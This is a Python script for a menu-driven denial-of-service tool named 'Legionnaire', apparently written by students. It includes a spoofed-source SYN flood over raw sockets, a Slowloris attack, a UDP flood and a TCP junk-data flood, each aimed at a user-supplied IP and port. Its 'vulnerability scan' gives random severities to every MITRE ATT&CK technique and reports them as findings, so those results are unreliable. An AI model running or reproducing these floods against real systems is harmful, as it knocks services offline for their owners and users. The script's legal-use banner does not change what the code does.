#!/usr/bin/env python3

import socket
import random
import time
import threading
import argparse
import os
import requests
import json
from termcolor import colored
import pyfiglet
from prettytable import PrettyTable
from datetime import datetime, timedelta

# Function to fetch MITRE ATT&CK data from GitHub
def fetch_mitre_data():
    url = 'https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json'
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        print(f"Failed to fetch MITRE ATT&CK data: {response.status_code} - {response.reason}")
        return None

# Function to extract techniques from MITRE data
def extract_techniques(data):
    techniques = {}
    for obj in data.get('objects', []):
        if obj.get('type') == 'attack-pattern':
            techniques[obj.get('id')] = {
                'name': obj.get('name'),
                'description': obj.get('description'),
                'severity': obj.get('x_mitre_impact_type', 'Unknown')  # Example field for severity
            }
    return techniques

# Function to print header
def print_header():
    os.system("clear")
    print("")
    header = pyfiglet.figlet_format("Legionnaire", font="banner3-D", width=240)
    print(colored(header, 'red'))
    print(colored("\n****************************************************************", "red"))
    print(colored("\n*             Copyright of Legionnaire, 2024                   *", 'red'))
    print(colored("\n****************************************************************\n", 'red'))
    print(colored("A portable DDoS adversary simulation tool designed by students of Network Technology and Cyber Security.\n", 'red'))
    print(colored("WARNING: Do not use this tool for illegal purposes. Ensure it is used for educational purposes or in\ncompliance with legal regulations.\n", 'yellow'))

# Function to create and send a SYN packet (Network DoS)
def send_syn_packet(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        ip_header = build_ip_header(target_ip)
        tcp_header = build_tcp_header(target_ip, target_port)
        packet = ip_header + tcp_header
        sock.sendto(packet, (target_ip, 0))
    except Exception as e:
        pass

def build_ip_header(target_ip):
    ip_header = b''
    ip_header += b'\x45'
    ip_header += b'\x00'
    ip_header += b'\x00\x28'
    ip_header += b'\xab\xcd'
    ip_header += b'\x00\x00'
    ip_header += b'\x40'
    ip_header += b'\x06'
    ip_header += b'\x00\x00'
    ip_header += socket.inet_aton(random_ip())
    ip_header += socket.inet_aton(target_ip)
    return ip_header

def build_tcp_header(target_ip, target_port):
    tcp_header = b''
    tcp_header += random.randint(0, 65535).to_bytes(2, byteorder='big')
    tcp_header += target_port.to_bytes(2, byteorder='big')
    tcp_header += random.randint(0, 4294967295).to_bytes(4, byteorder='big')
    tcp_header += (0).to_bytes(4, byteorder='big')
    tcp_header += b'\x50'
    tcp_header += b'\x02'
    tcp_header += b'\x71\x10'
    tcp_header += b'\x00\x00'
    tcp_header += b'\x00\x00'
    return tcp_header

def random_ip():
    return '.'.join([str(random.randint(1, 254)) for _ in range(4)])

def run_ddos(target_ip, target_port, num_threads, duration):
    threads = []
    start_time = datetime.now()
    for _ in range(num_threads):
        thread = threading.Thread(target=send_syn_packets, args=(target_ip, target_port, duration))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
    end_time = datetime.now()
    attack_duration = end_time - start_time
    return attack_duration

def send_syn_packets(target_ip, target_port, duration):
    end_time = time.time() + duration * 60
    while time.time() < end_time:
        send_syn_packet(target_ip, target_port)

# Function to create a socket and send partial HTTP requests (Endpoint DoS)
def slowloris_attack(target, port, num_sockets, duration):
    sockets = []
    end_time = time.time() + duration * 60
    for _ in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1000)).encode("utf-8"))
            s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            sockets.append(s)
        except socket.error:
            break
    while time.time() < end_time:
        try:
            for s in list(sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    sockets.remove(s)
            time.sleep(15)
        except (KeyboardInterrupt, SystemExit):
            break

def run_slowloris(target_ip, target_port, num_sockets, duration):
    threads = []
    start_time = datetime.now()
    for _ in range(num_sockets):
        thread = threading.Thread(target=slowloris_attack, args=(target_ip, target_port, num_sockets, duration))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
    end_time = datetime.now()
    attack_duration = end_time - start_time
    return attack_duration

# Function to perform a Service Exhaustion Flood
def service_exhaustion_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    end_time = time.time() + duration * 60
    start_time = datetime.now()
    while time.time() < end_time:
        sock.sendto(packet, (target_ip, target_port))
    end_time = datetime.now()
    attack_duration = end_time - start_time
    return attack_duration

# Function to simulate an Application/System Exploit
def application_system_exploit(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    end_time = time.time() + duration * 60
    start_time = datetime.now()
    while time.time() < end_time:
        sock.send(random._urandom(1024))
    end_time = datetime.now()
    attack_duration = end_time - start_time
    return attack_duration

# Function to display attack details in a table
def display_details(attack_type, target_ip, target_port, threads_or_sockets, duration, mitre_techniques):
    table = PrettyTable()
    table.field_names = ["Detail", "Value"]
    table.add_row(["Attack Type", attack_type])
    table.add_row(["Target IP", target_ip])
    table.add_row(["Target Port", target_port])
    table.add_row(["Threads/Sockets", threads_or_sockets])
    table.add_row(["Duration", str(duration)])
    if attack_type in mitre_techniques:
        technique = mitre_techniques[attack_type]
        table.add_row(["MITRE Tactic", technique["tactic"]])
        table.add_row(["MITRE Technique", technique["technique"]])
    print(table)

    with open("attack_log.txt", "a") as log_file:
        log_file.write(f"Attack Type: {attack_type}\n")
        log_file.write(f"Target IP: {target_ip}\n")
        log_file.write(f"Target Port: {target_port}\n")
        log_file.write(f"Threads/Sockets: {threads_or_sockets}\n")
        log_file.write(f"Duration: {str(duration)}\n")
        if attack_type in mitre_techniques:
            log_file.write(f"MITRE Tactic: {technique['tactic']}\n")
            log_file.write(f"MITRE Technique: {technique['technique']}\n")
        log_file.write("\n")

# Function to simulate vulnerability scanning using MITRE data
def vulnerability_scanner(target_ip, mitre_techniques):
    vulnerabilities = []
    for technique_id, technique in mitre_techniques.items():
        vulnerabilities.append({
            "vulnerability": technique['name'],
            "severity": random.choice(["Low", "Medium", "High", "Critical"]),
            "description": technique['description']
        })

    with open("vulnerability_scan.txt", "w") as scan_file:
        scan_file.write(f"Vulnerability scan results for {target_ip}:\n")
        for vuln in vulnerabilities:
            scan_file.write(f"- {vuln['vulnerability']} (Severity: {vuln['severity']})\n  Description: {vuln['description']}\n\n")
    
    return vulnerabilities

# Main menu function
def main_menu(mitre_techniques):
    while True:
        print_header()
        print("1. Network Denial of Service (DoS)")
        print("2. Endpoint Denial of Service (Slowloris)")
        print("3. Service Exhaustion Flood")
        print("4. Application/System Exploit")
        print("0. Exit")
        choice = input("PASTMAF > ")

        if choice == '1':
            network_dos_menu(mitre_techniques)
        elif choice == '2':
            endpoint_dos_menu(mitre_techniques)
        elif choice == '3':
            service_exhaustion_menu(mitre_techniques)
        elif choice == '4':
            application_exploit_menu(mitre_techniques)
        elif choice == '0':
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")

def network_dos_menu(mitre_techniques):
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port number: "))
    num_threads = int(input("Enter number of threads: "))
    duration = 10
    print("Starting Network DoS attack for 10 minutes...")
    vulnerabilities = vulnerability_scanner(target_ip, mitre_techniques)
    attack_duration = run_ddos(target_ip, target_port, num_threads, duration)
    display_details("Network DoS", target_ip, target_port, num_threads, attack_duration, mitre_techniques)

def endpoint_dos_menu(mitre_techniques):
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port number: "))
    num_sockets = int(input("Enter number of sockets: "))
    duration = 10
    print("Starting Slowloris attack for 10 minutes...")
    vulnerabilities = vulnerability_scanner(target_ip, mitre_techniques)
    attack_duration = run_slowloris(target_ip, target_port, num_sockets, duration)
    display_details("Endpoint DoS", target_ip, target_port, num_sockets, attack_duration, mitre_techniques)

def service_exhaustion_menu(mitre_techniques):
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port number: "))
    duration = 10
    print("Starting Service Exhaustion Flood for 10 minutes...")
    vulnerabilities = vulnerability_scanner(target_ip, mitre_techniques)
    attack_duration = service_exhaustion_flood(target_ip, target_port, duration)
    display_details("Service Exhaustion Flood", target_ip, target_port, "N/A", attack_duration, mitre_techniques)

def application_exploit_menu(mitre_techniques):
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port number: "))
    duration = 10
    print("Starting Application/System Exploit for 10 minutes...")
    vulnerabilities = vulnerability_scanner(target_ip, mitre_techniques)
    attack_duration = application_system_exploit(target_ip, target_port, duration)
    display_details("Application/System Exploit", target_ip, target_port, "N/A", attack_duration, mitre_techniques)

if __name__ == '__main__':
    mitre_data = fetch_mitre_data()
    if mitre_data:
        mitre_techniques = extract_techniques(mitre_data)
        main_menu(mitre_techniques)
    else:
        print("Unable to fetch MITRE ATT&CK data. Exiting...")